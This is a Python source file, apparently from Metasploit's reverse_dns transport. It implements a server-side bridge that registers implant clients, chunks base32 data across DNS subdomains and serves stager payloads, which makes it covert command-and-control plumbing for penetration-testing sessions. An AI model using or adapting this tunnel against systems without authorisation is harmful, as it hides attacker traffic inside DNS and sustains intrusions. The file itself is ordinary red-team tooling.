#!/usr/bin/env python
# coding=utf-8

# MSF Bridge for reverse_dns transport
#
# Authors: Maxim Andreyanov, Alexey Sintsov
#

import logging
import base64
import Queue
import threading
import time
from utils import *

class Registrator(object):
    __instance = None
    CLIENT_TIMEOUT = 40

    @staticmethod
    def instance():
        if not Registrator.__instance:
            Registrator.__instance = Registrator()
        return Registrator.__instance

    def __init__(self):
        self.id_list = [chr(i) for i in range(ord('a'), ord('z')+1)]
        self.clientMap = {}
        self.servers = {}
        self.stagers = {}
        self.waited_servers = {}
        self.unregister_list = []
        self.lock = threading.Lock()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.default_stager = StageClient()
        self.timeout_service = TimeoutService(timeout=20)
        self.timeout_service.add_callback(self.on_timeout)

    def shutdown(self):
        self.timeout_service.remove_callback(self.on_timeout)

    def register_client_for_server(self, server_id, client):
        self.logger.info("Register client(%s) for server '%s'", client.get_id(), server_id)
        with self.lock:
            self.servers.setdefault(server_id, []).append(client)
        self._notify_waited_servers(server_id)

    def request_client_id(self, client):
        client_id = None
        with self.lock:
            try:
                client_id = self.id_list.pop(0)
                self.clientMap[client_id] = client
            except IndexError as e:
                self.logger.error("Can't find free id for new client.", exc_info=True)
                return None
        return client_id

    def _notify_waited_servers(self, server_id):
        notify_server = None
        with self.lock:
            waited_lst = self.waited_servers.get(server_id, [])
            if waited_lst:
                notify_server = waited_lst.pop(0)
                if not waited_lst:
                    del self.waited_servers[server_id]
        if notify_server:
            self.logger.info("Notify server(%s)", notify_server)
            notify_server.on_new_client()

    def subscribe(self, server_id, server):
        with self.lock:
            self.waited_servers.setdefault(server_id, []).append(server)
        self.logger.info("Subscription is done for server with %s id.", server_id)

    def unsubscribe(self, server_id, server):
        with self.lock:
            waited_lst = self.waited_servers.get(server_id, [])
            if waited_lst:
                with ignored(ValueError):
                    waited_lst.remove(server)
        self.logger.info("Unsubscription is done for server with %s id.", server_id)

    def get_client_by_id(self, client_id):
        with self.lock:
            with ignored(KeyError):
                return self.clientMap[client_id]

    def get_new_client_for_server(self, server_id):
        self.logger.info("Looking for clients...")
        with self.lock:
            with ignored(IndexError):
                clients = self.servers.get(server_id, [])
                assigned_client = clients.pop(0)
                if not clients:
                    del self.servers[server_id]
                return assigned_client

    def get_stage_client_for_server(self, server_id):
        with self.lock:
            try:
                return self.stagers[server_id]
            except KeyError:
                self.logger.info("Trying to request stager for server with %s id", server_id)
                waited_lst = self.waited_servers.get(server_id, [])
                if waited_lst:
                    server = waited_lst[0]
                    server.request_stage()
                else:
                    self.logger.info("Server list is empty")
                return self.default_stager

    def add_stager_for_server(self, server_id, data):
        with self.lock:
            self.stagers[server_id] = StageClient(data)

    def is_stager_server(self, server_id):
        with self.lock:
            return server_id in self.stagers

    def _unregister_client(self, client_id):
        with self.lock:
            with ignored(KeyError):
                del self.clientMap[client_id]
                self.id_list.append(client_id)
                self.logger.error("Unregister client with id %s successfully", client_id)

    def unregister_client(self, client_id, pending=True):
        if pending:
            with self.lock:
                self.unregister_list.append(client_id)
        else:
            self._unregister_client(client_id)

    def on_timeout(self, cur_time):
        disconnect_client_lst = []
        with self.lock:
            ids_for_remove = []
            for client_id, client in self.clientMap.iteritems():
                if abs(cur_time - client.ts) >= self.CLIENT_TIMEOUT:
                    ids_for_remove.append(client_id)
                    disconnect_client_lst.append(client)

            for client_id in ids_for_remove:
                del self.clientMap[client_id]
                self.id_list.append(client_id)
                self.logger.info("Unregister client with '%s' id(reason: timeout)", client_id)

            ids_for_remove = [server_id for server_id, client in self.stagers.iteritems()
                              if abs(client.ts - cur_time) >= self.CLIENT_TIMEOUT * 4]

            for server_id in ids_for_remove:
                waiters = self.waited_servers.get(server_id, [])
                if not waiters:
                    del self.stagers[server_id]
                    self.logger.info("Clearing stager client for server with '%s' id(reason: timeout)", server_id)

            unregister_list = []
            for client_id in self.unregister_list:
                client = self.clientMap.get(client_id, None)
                if client:
                    if client.is_idle():
                        del self.clientMap[client_id]
                        self.id_list.append(client_id)
                        self.logger.info("Unregister client with '%s' id", client_id)
                    else:
                        unregister_list.append(client_id)

            self.unregister_list = unregister_list
                    
        for client in disconnect_client_lst:
            if client.server_id:
                clients = self.servers.get(client.server_id, [])
                with ignored(ValueError):
                    clients.remove(client)
            client.on_timeout()


class TimeoutService(object):
    DEFAULT_TIMEOUT = 40

    def __init__(self, timeout=DEFAULT_TIMEOUT):
        self.timeout = timeout
        self.timer = None
        self.lock = threading.RLock()
        self.listeners = set()
        self.one_shot_listeners = set()

    def _setup_timer(self):
        if self.timer:
            self.timer.cancel()
        self.timer = threading.Timer(self.timeout, self.timer_expired)
        self.timer.start()

    def _empty_listeners(self):
        return len(self.listeners) == 0 and len(self.one_shot_listeners) == 0

    def timer_expired(self):
        with self.lock:
            for listener in (self.listeners | self.one_shot_listeners):
                cur_time = int(time.time())
                listener(cur_time)
            self.one_shot_listeners = set()

            if not self._empty_listeners():
                self._setup_timer()
            else:
                self.timer.cancel()
                self.timer = None

    def add_callback(self, callback, one_shot=False):
        with self.lock:
            listeners = self.one_shot_listeners if one_shot else self.listeners
            no_listeners = self._empty_listeners()
            listeners.add(callback)
            if no_listeners:
                self._setup_timer()

    def remove_callback(self, callback):
        with self.lock:
            with ignored(KeyError):
                self.listeners.remove(callback)
            if self._empty_listeners() and self.timer is not None:
                self.timer.cancel()
                self.timer = None


class Client(object):
    INITIAL = 1
    INCOMING_DATA = 2

    def __init__(self):
        self.state = self.INITIAL
        self.logger = logging.getLogger(self.__class__.__name__)
        # self.logger.setLevel(logging.DEBUG)
        self.received_data = PartedData()
        self.last_received_index = -1
        self.sub_domain = "aaaa"
        self.send_data = None
        self.server_queue = Queue.Queue()
        self.client_queue = Queue.Queue()
        self.server = None
        self.client_id = None
        self.server_id = None
        self.register_for_server_needed = False
        self.ts = 0
        self.lock = threading.Lock()

    def update_last_request_ts(self):
        self.ts = int(time.time())

    def is_idle(self):
        with self.lock:
            # msf sends 2 packets after exit packet, but client doesn't request it
            # self.client_queue.empty() and \ 
            return not self.server and not self.received_data.is_complete() 

    def register_client(self, server_id, encoder):
        client_id = Registrator.instance().request_client_id(self)
        if client_id:
            self.client_id = client_id
            self.server_id = server_id
            self.register_for_server_needed = True
            self.logger.info("Registered new client with %s id for server_id %s", client_id, server_id)
            return encoder.encode_registration(client_id, 0)
        else:
            self.logger.info("Can't register client")
            return encoder.encode_finish_send()

    def get_id(self):
        return self.client_id

    def _setup_receive(self, exp_data_size, padding):
        self.state = self.INCOMING_DATA
        self.received_data.reset(exp_data_size)
        self.last_received_index = -1
        self.padding = padding

    def _initial_state(self):
        self.state = self.INITIAL
        self.received_data.reset()
        self.last_received_index = -1
        self.padding = 0

    def set_server(self, server):
        with self.lock:
            self.server = server

    def incoming_data_header(self, data_size, padding, encoder):
        if self.received_data.get_expected_size() == data_size and self.state == self.INCOMING_DATA:
            self.logger.info("Duplicated header request: waiting %d bytes of data with padding %d", data_size, padding)
            return encoder.encode_ready_receive()
        elif self.state == self.INCOMING_DATA:
            self.logger.error("Bad request. Client in the receiving data state")
            return None
        self.logger.info("Data header: waiting %d bytes of data", data_size)
        self._setup_receive(data_size, padding)
        return encoder.encode_ready_receive()

    def incoming_data(self, data, index, counter, encoder):
        self.logger.debug("Data %s, index %d", data, index)
        if self.state != self.INCOMING_DATA:
            self.logger.error("Bad state(%d) for this action. Send finish.", self.state)
            return encoder.encode_finish_send()

        data_size = len(data)
        if data_size == 0:
            self.logger.error("Empty incoming data. Send finish.")
            return encoder.encode_finish_send()

        if self.last_received_index >= index:
            self.logger.info("Duplicated packet.")
            return encoder.encode_send_more_data()

        try:
            self.received_data.add_part(data)
        except ValueError:
            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data.")
            self._initial_state()
            return encoder.encode_finish_send()

        self.last_received_index = index
        if self.received_data.is_complete():
            self.logger.info("All expected data is received")
            try:
                packet = base64.b32decode(self.received_data.get_data() + "=" * self.padding, True)
                self.logger.info("Put decoded data to the server queue")
                self.server_queue.put(packet)
                self._initial_state()
                if self.server:
                    self.logger.info("Notify server")
                    self.server.polling()
            except Exception:
                self.logger.error("Error during decode received data", exc_info=True)
                self._initial_state()
                return encoder.encode_finish_send()
        return encoder.encode_send_more_data()

    def request_data_header(self, sub_domain, encoder):
        if sub_domain == self.sub_domain:
            if self.register_for_server_needed:
                Registrator.instance().register_client_for_server(self.server_id, self)
                self.register_for_server_needed = False

            if not self.send_data:
                with ignored(Queue.Empty):
                    self.logger.info("Checking client queue...")
                    data = self.client_queue.get_nowait()
                    self.send_data = BlockSizedData(data, encoder.MAX_PACKET_SIZE)
                    self.logger.debug("New data found: size is %d", len(data))

            data_size = 0
            if self.send_data:
                next_sub = encoder.get_next_sdomain(self.sub_domain)
                sub_domain = next_sub
                data_size = self.send_data.get_size()
            else:
                self.logger.info("No data for client.(%s)", "server" if self.server else "no server")
            self.logger.info("Send data header to client with domain %s and size %d", sub_domain, data_size)
            return encoder.encode_data_header(sub_domain, data_size)
        else:
            self.logger.info("Subdomain is different %s(request) - %s(client)", sub_domain, self.sub_domain)
            if sub_domain == "aaaa":
                self.logger.info("MIGRATION.")
            self.sub_domain = sub_domain
            self.send_data = None

    def request_data(self, sub_domain, index, encoder):
        self.logger.debug("request_data - %s, %d", sub_domain, index)
        if sub_domain != self.sub_domain:
            self.logger.error("request_data: subdomains are not equal(%s-%s)", self.sub_domain, sub_domain)
            return None

        if not self.send_data:
            self.logger.error("Bad request. There are no data.")
            return None

        try:
            _, data = self.send_data.get_data(index)
            self.logger.debug("request_data: return data %s", data)
            return encoder.encode_packet(data)
        except ValueError:
            self.logger.error("request_data: index(%d) out of range.", index)

    def server_put_data(self, data):
        self.logger.info("Server adds data to queue.")
        self.client_queue.put(data)

    def server_get_data(self, timeout=2):
        self.logger.info("Checking server queue...")
        with ignored(Queue.Empty):
            data = self.server_queue.get(True, timeout)
            self.logger.info("There are new data(length=%d) for the server", len(data))
            return data

    def server_has_data(self):
        return not self.server_queue.empty()

    def on_timeout(self):
        if self.server:
            self.server.on_client_timeout()
            self.server = None


class StageClient(object):
    subdomain = '7812'

    def __init__(self, data=None):
        self.stage_data = data
        self.data_len = len(data) if data else 0
        self.encoder_data = {}
        self.ts = 0

    def update_last_request_ts(self):
        self.ts = int(time.time())

    def request_data_header(self, encoder):
        return encoder.encode_data_header(self.subdomain, self.data_len)

    def request_data(self, index, encoder):
        if not self.stage_data:
            return encoder.encode_finish_send()
        
        send_data = self.encoder_data.get(encoder, None)
        if not send_data:
            send_data = BlockSizedData(self.stage_data, encoder.MAX_PACKET_SIZE)
            self.encoder_data[encoder] = send_data
        _, data = send_data.get_data(index)
        return encoder.encode_packet(data)
